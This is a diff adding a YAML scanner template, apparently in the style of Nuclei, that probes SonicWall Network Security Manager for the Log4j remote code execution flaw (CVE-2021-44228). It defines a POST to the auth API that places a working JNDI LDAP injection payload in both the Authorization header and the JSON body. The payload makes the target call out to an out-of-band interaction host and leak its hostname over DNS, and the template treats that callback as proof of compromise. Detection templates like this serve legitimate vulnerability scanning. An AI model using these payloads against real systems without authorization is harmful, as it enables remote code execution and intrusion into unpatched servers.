@@ -1,0 +1,36 @@
+id: sonicwall-nsm-log4j-rce
+brief:
+    title: Sonicwall NSM - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Sonicwall NSM is susceptible to Log4j JNDI remote code execution. SonicWall Network Security Manager (NSM) allows you to centrally orchestrate all firewall operations error-free, see and manage thr...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - sonicwall
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/sonicos/auth'
+      head:
+        Accept: application/json, text/plain, /
+        Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
+        Content-Type: application/json
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}'
+        X-Snwl-Api-Scope: extended
+        X-Snwl-Timer: no-reset
+      body: '{"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
